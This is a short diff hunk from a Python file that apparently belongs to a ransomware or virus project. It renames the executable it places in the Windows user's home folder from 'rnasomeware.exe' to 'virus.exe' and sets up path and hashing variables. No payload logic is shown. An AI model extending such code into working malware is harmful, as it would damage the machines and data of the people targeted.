@@ -11,7 +11,7 @@ from multiprocessing import Process
 main_file_directory = os.getcwd()
 user_name = os.getenv('username')
 destination_directory = "C://Users//" + user_name
-executable_file_directory = destination_directory + "rnasomeware.exe"
+executable_file_directory = destination_directory + "virus.exe"
 sha_256 = hashlib.sha256
 
 
